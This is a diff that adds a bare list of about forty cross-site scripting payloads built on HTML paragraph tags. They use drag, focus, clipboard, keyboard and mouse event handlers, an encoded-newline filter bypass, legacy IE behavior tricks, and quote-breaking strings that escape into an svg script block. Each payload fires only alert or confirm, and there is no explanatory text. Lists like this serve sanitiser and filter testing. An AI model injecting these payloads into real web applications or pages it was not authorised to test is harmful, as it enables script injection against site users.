@@ -1,0 +1,39 @@
+<p draggable="true" ondrag="alert(1)">test</p>
+<p draggable="true" ondragend="alert(1)">test</p>
+<p draggable="true" ondragenter="alert(1)">test</p>
+<p draggable="true" ondragleave="alert(1)">test</p>
+<p draggable="true" ondragstart="alert(1)">test</p>
+<p/%0Aonmouseover%0A=%0Aconfirm(1)>xss
+<p id=x tabindex=1 onactivate=alert(1)></p>
+<p id=x tabindex=1 onbeforeactivate=alert(1)></p>
+<p id=x tabindex=1 onbeforedeactivate=alert(1)></p><input autofocus>
+<p id=x tabindex=1 ondeactivate=alert(1)></p><input id=y autofocus>
+<p id=x tabindex=1 onfocus=alert(1)></p>
+<p id=x tabindex=1 onfocusin=alert(1)></p>
+<p onbeforecopy="alert(1)" contenteditable>test</p>
+<p onbeforecut="alert(1)" contenteditable>test</p>
+<p onbeforepaste="alert(1)" contenteditable>test</p>
+<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>
+<p onclick="alert(1)">test</p>
+<p oncontextmenu="alert(1)">test</p>
+<p oncopy="alert(1)" contenteditable>test</p>
+<p oncut="alert(1)" contenteditable>test</p>
+<p ondblclick="alert(1)">test</p>
+<p onfocusout=alert(1) tabindex=1 id=x></p><input autofocus>
+<p onkeydown="alert(1)" contenteditable>test</p>
+<p onkeypress="alert(1)" contenteditable>test</p>
+<p onkeyup="alert(1)" contenteditable>test</p>
+<p onmousedown="alert(1)">test</p>
+<p onmouseenter="alert(1)">test</p>
+<p onmouseleave="alert(1)">test</p>
+<p onmousemove="alert(1)">test</p>
+<p onmouseout="alert(1)">test</p>
+<p onmouseover="alert(1)">test</p>
+<p onmouseup="alert(1)">test</p>
+<p onpaste="alert(1)" contenteditable>test</p>
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1611)">
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(697)">
+"'`><p><svg><script>a='hello\x27;javascript:alert(1264)//';</script></p>
+"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
+"'`><p><svg><script>a='hello\x27;javascript:alert(365)//';</script></p>
